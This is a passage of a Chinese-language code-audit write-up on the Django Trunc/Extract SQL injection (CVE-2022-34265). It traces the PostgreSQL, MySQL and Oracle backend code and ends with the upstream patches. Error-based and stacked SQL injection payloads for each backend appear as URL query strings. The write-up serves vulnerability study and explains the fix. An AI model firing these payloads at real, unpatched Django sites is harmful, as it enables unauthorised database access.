以上回显不同，可以使用盲注，另外 SQLite 没有 IF，用 `CASE WHEN` 即可。
### PostgreSQL
    def datetime_extract_sql(self, lookup_type, field_name, tzname):
            field_name = self._convert_field_to_tz(field_name, tzname)
            return self.date_extract_sql(lookup_type, field_name)
        def datetime_trunc_sql(self, lookup_type, field_name, tzname):
            field_name = self._convert_field_to_tz(field_name, tzname)
            # https://www.postgresql.org/docs/current/functions-datetime.html#FUNCTIONS-DATETIME-TRUNC
            return "DATE_TRUNC('%s', %s)" % (lookup_type, field_name)
date_extract_sql
    def date_extract_sql(self, lookup_type, field_name):
            ...
            else:
                # 进入这个分支
                return "EXTRACT('%s' FROM %s)" % (lookup_type, field_name)
Extract 的 sql 语句：
调试获取到的 sql 语句如下：
    EXTRACT('year' FROM "vulmodel_experiment"."start_datetime" AT TIME ZONE 'UTC')
Trunc 的 sql 语句：
    DATE_TRUNC('year', "vulmodel_experiment"."start_datetime");
    -- 查询语句如下
    SELECT "vulmodel_experiment"."id", "vulmodel_experiment"."start_datetime", "vulmodel_experiment"."start_date", "vulmodel_experiment"."start_time", "vulmodel_experiment"."end_datetime", "vulmodel_experiment"."end_date", "vulmodel_experiment"."end_time" FROM "vulmodel_experiment" WHERE ("vulmodel_experiment"."start_datetime")::date = (DATE_TRUNC('year', "vulmodel_experiment"."start_datetime"))
由上构造 payload：
    /extract/?lookup_name=year' FROM start_datetime)) OR 1=1;select cast((select version()) as numeric)-- +
    /trunc/?kind=year', start_datetime)) OR 1=1;select cast((select version()) as numeric)-- +
报错注入如下：
因此 Extract 和 Trunc 在 PostgreSQL 中是存在漏洞的。
### MYSQL
    def datetime_extract_sql(self, lookup_type, field_name, tzname):
            field_name = self._convert_field_to_tz(field_name, tzname)
            return self.date_extract_sql(lookup_type, field_name)
        def datetime_trunc_sql(self, lookup_type, field_name, tzname):
            field_name = self._convert_field_to_tz(field_name, tzname)
            fields = ["year", "month", "day", "hour", "minute", "second"]
            # 可以看到 fields 都有对应的 format 填充
            format = (
                "%%Y-",
                "%%m",
                "-%%d",
                " %%H:",
                "%%i",
                ":%%s",
            )  # Use double percents to escape.
            format_def = ("0000-", "01", "-01", " 00:", "00", ":00")
            if lookup_type == "quarter":
                return (
                    "CAST(DATE_FORMAT(MAKEDATE(YEAR({field_name}), 1) + "
                    "INTERVAL QUARTER({field_name}) QUARTER - "
                    + "INTERVAL 1 QUARTER, '%%Y-%%m-01 00:00:00') AS DATETIME)"
                ).format(field_name=field_name)
            if lookup_type == "week":
                return (
                    "CAST(DATE_FORMAT(DATE_SUB({field_name}, "
                    "INTERVAL WEEKDAY({field_name}) DAY), "
                    "'%%Y-%%m-%%d 00:00:00') AS DATETIME)"
                ).format(field_name=field_name)
            try:
                i = fields.index(lookup_type) + 1
            except ValueError:
                sql = field_name
            else:
                format_str = "".join(format[:i] + format_def[i:])
                sql = "CAST(DATE_FORMAT(%s, '%s') AS DATETIME)" % (field_name, format_str)
            return sql
就上面的来看 Trunc 是不存在漏洞的，都用对应 format 格式字符串代替了，来看 Extract 调用的 `date_extract_sql`：
    def date_extract_sql(self, lookup_type, field_name):
            ...
            else:
                # EXTRACT returns 1-53 based on ISO-8601 for the week number.
                # 进入这个分支
                return "EXTRACT(%s FROM %s)" % (lookup_type.upper(), field_name)
不过是将值变为了大写。
下面调试获取 sql 语句看看：
调试获取到 EXTRACT sql 语句如下：
    EXTRACT(YEAR FROM `vulmodel_experiment`.`start_datetime`)
注意 MYSQL 中拼接没用单双引号。
payload 构造：
    /extract/?lookup_name=year from start_datetime)) and updatexml(1,concat(1,database()),0)-- +
接下来测试 Trunc 函数：
调试获取到的 sql 语句如下：
    CAST(DATE_FORMAT(`vulmodel_experiment`.`start_datetime`, '%%Y-01-01 00:00:00') AS DATETIME)
    -- 查询语句
    SELECT `vulmodel_experiment`.`id`, `vulmodel_experiment`.`start_datetime`, `vulmodel_experiment`.`start_date`, `vulmodel_experiment`.`start_time`, `vulmodel_experiment`.`end_datetime`, `vulmodel_experiment`.`end_date`, `vulmodel_experiment`.`end_time` FROM `vulmodel_experiment` 
    WHERE DATE(`vulmodel_experiment`.`start_datetime`) = (CAST(DATE_FORMAT(`vulmodel_experiment`.`start_datetime`, '%%Y-01-01 00:00:00') AS DATETIME)) LIMIT 21
可以看到与代码对应了，故 MYSQL 后端 Trunc 函数并不存在该漏洞。
### Oracle
    def datetime_extract_sql(self, lookup_type, field_name, tzname):
            field_name = self._convert_field_to_tz(field_name, tzname)
            return self.date_extract_sql(lookup_type, field_name)
        def datetime_trunc_sql(self, lookup_type, field_name, tzname):
            field_name = self._convert_field_to_tz(field_name, tzname)
            # https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/ROUND-and-TRUNC-Date-Functions.html
            if lookup_type in ("year", "month"):
                sql = "TRUNC(%s, '%s')" % (field_name, lookup_type.upper())
            elif lookup_type == "quarter":
                sql = "TRUNC(%s, 'Q')" % field_name
            elif lookup_type == "week":
                sql = "TRUNC(%s, 'IW')" % field_name
            elif lookup_type == "day":
                sql = "TRUNC(%s)" % field_name
            elif lookup_type == "hour":
                sql = "TRUNC(%s, 'HH24')" % field_name
            elif lookup_type == "minute":
                sql = "TRUNC(%s, 'MI')" % field_name
            else:
                # 进入这个分支
                sql = (
                    "CAST(%s AS DATE)" % field_name
                )  # Cast to DATE removes sub-second precision.
            return sql
可以看到 Trunc 是不存在的，拼接进去的只有 field_name，`date_extract_sql` 还是老样子改了个大写：
    def date_extract_sql(self, lookup_type, field_name):
            ...
            else:
                # 进入这个分支
                # https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/EXTRACT-datetime.html
                return "EXTRACT(%s FROM %s)" % (lookup_type.upper(), field_name)
Extract 调试：
调试获取到的 sql 语句：
    EXTRACT(YEAR FROM "VULMODEL_EXPERIMENT"."START_DATETIME")
payload 可类似构造如下（Oracle 不能堆叠注入）：
    /extract/?lookup_name=year from start_datetime)) and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1))-- +
接下来测试 Trunc 函数：
sql 语句如下：
    TRUNC("VULMODEL_EXPERIMENT"."START_DATETIME") = (CAST("VULMODEL_EXPERIMENT"."START_DATETIME" AS DATE))
没有 `lookup_type` 拼接入，所以 Oracle 后端 Trunc 也是不存在漏洞的。
## 修复总结
由上审计调试过程可以得出一个结论——在 Django 影响版本下， Extract 在常用四大数据库中是都存在漏洞的，而 Trunc 在 Oracle 和
MYSQL 作为后端数据库时并不存在漏洞，其他比如 MariaDB 是同 MYSQL 共享后端的，漏洞存在情况应同 MYSQL
一致，而其他第三方数据库支持的 Django 版本和 ORM 功能有很大的不同，这些都要具体情况具体分析了。
来看看是怎么修复的：
[4.0.x
的补丁](https://github.com/django/django/commit/54eb8a374d5d98594b264e8ec22337819b37443c)
[3.2.x
的补丁](https://github.com/django/django/commit/a9010fe5555e6086a9d9ae50069579400ef0685e)
可以看到在 base 模块（因为 Django 是子类化内置数据库后端的）加了一个正则匹配，而之后在 `as_sql` 生成 sql
片段时就做了一个判断，提前做好了过滤：
## 参考文档
[数据库函数 | Django 文档 | Django
(djangoproject.com)](https://docs.djangoproject.com/zh-hans/3.2/ref/models/database-functions/#extract)
[GitHub - aeyesec/CVE-2022-34265: PoC for CVE-2022-34265
(Django)](https://github.com/aeyesec/CVE-2022-34265)
以及 p 牛在《代码审计》知识星球中的分析。